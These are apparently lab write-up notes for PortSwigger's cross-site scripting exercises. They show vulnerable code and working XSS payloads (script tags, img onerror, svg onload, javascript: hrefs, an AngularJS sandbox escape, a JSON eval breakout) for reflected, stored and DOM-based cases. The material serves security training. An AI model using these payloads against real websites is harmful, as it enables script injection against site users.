---
description: https://portswigger.net/web-security/cross-site-scripting
---

# Cross-site scripting

### Lab: Reflected XSS into HTML context with nothing encoded

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

```
/?search=test
<h1>1 search results for 'test'</h1>

<script>alert(0)</script>
```

### Lab: Stored XSS into HTML context with nothing encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

`csrf=dEw6a3DaskdxmTVrwvlONQj1sGecwy30&postId=6&comment=`**`%3Cscript%3Ealert%280%29%3C%2Fscript%3E`**`+This+is+a+comment.&name=test&email=test%40test.com&website=https%3A%2F%2Fwww.test.com`

```
<script>alert(0)</script>
```

### Lab: DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

```
<script>
	function trackSearch(query) {
		document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
	}
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) {
		trackSearch(query);
	}
</script>
```

**Search -> 123456789**

```
<script>
...
<img src="/resources/images/tracker.gif?searchTerms=123456789">
...
</script>
```

**Search ->**

```
"><svg onload=alert(1)>
```

### Lab: DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

```
<script>
	var stores = ["London","Paris","Milan"];
	var store = (new URLSearchParams(window.location.search)).get('storeId');
	document.write('<select name="storeId">');
	if(store) {
		document.write('<option selected>'+store+'</option>');
	}
	for(var i=0;i<stores.length;i++) {
		if(stores[i] === store) {
			continue;
		}
		document.write('<option>'+stores[i]+'</option>');
	}
	document.write('</select>');
</script>
```

```
/product?productId=1&storeId=London"><script>alert(1)</script>"
London">"

/product?productId=1&storeId=Milan"><script>alert(1)</script>"
Milan">"

product?productId=1&storeId="><img src=1 onerror=alert(1)>
```

### Lab: DOM XSS in innerHTML sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

```
<script>
	function doSearchQuery(query) {
		document.getElementById('searchMessage').innerHTML = query;
	}
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) {
		doSearchQuery(query);
	}
</script>
```

```
<img src=1 onerror=alert(document.domain)>
```

### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

```
<script>
	$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>
```

```
/feedback?returnPath=/123456789
<a id="backLink" href="/123456789">Back</a>

/feedback?returnPath=javascript:alert(document.domain)
<a id="backLink" href="javascript:alert(document.domain)">Back</a>
```

### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

```
<body ng-app>
```

**Search ->**

```
{{$on.constructor('alert(0)')()}}
```

### Lab: Reflected DOM XSS

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

**Search -> 12345678**

```
GET /?search=12345678 HTTP/1.1
GET /search-results?search=12345678 HTTP/1.1
{"results":[],"searchTerm":"12345678"}
```

```
/resources/js/searchResults.js
eval('var searchResultsObj = ' + this.responseText);
```

**Search ->**

```
 \"-alert(1)}//

{"results":[],"searchTerm":"\\"-alert(1)}//"}
```

### Lab: Stored DOM XSS

This lab demonstrates a stored DOM vulnerability in the blog comment functionality.

```
GET /post/comment?postId=9 HTTP/1.1
{
    "avatar":"",
    "website":"https://www.test.com",
    "date":"2021-11-21T22:51:20.697595457Z",
    "body":"test",
    "author":"test"
}
```

```
<script>alert(0)</script>
```

Website encoded first <> angle brackets. If we add <> at the beginning we can bypass it. But we can not. We can see the cause in the response.

```
"body":"<><script>alert(0)<\/script>",
"author":"<><script>alert(0)<\/script>"
```

JS added \ before /. So we can not use this payload. Try another one.

```
<><img src=1 onerror=alert(1)>
```

> In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets.
